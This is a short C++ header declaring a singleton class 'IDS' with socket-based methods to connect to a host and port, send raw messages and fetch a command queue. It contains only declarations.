#ifndef IDS_H
#define IDS_H

#include <iostream>
#include <stdexcept>

#include <cstdlib>
#include <cstring>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "CommandQueue.h"

class IDS
{
	protected: //Hidden Singleton Setup
		static class IDS* singleton;
		IDS();
		~IDS();
	protected: //Hidden Member attributes
		int sock_desc;
	public: //Singleton constructor
		static IDS* getSingleton();
	public:
		void cnc_connect(std::string host, size_t port);
		int cnc_rawmsg(const void* msg, size_t msg_size);
		CommandQueue* getCmdQueue();
		bool quit();
};

#endif
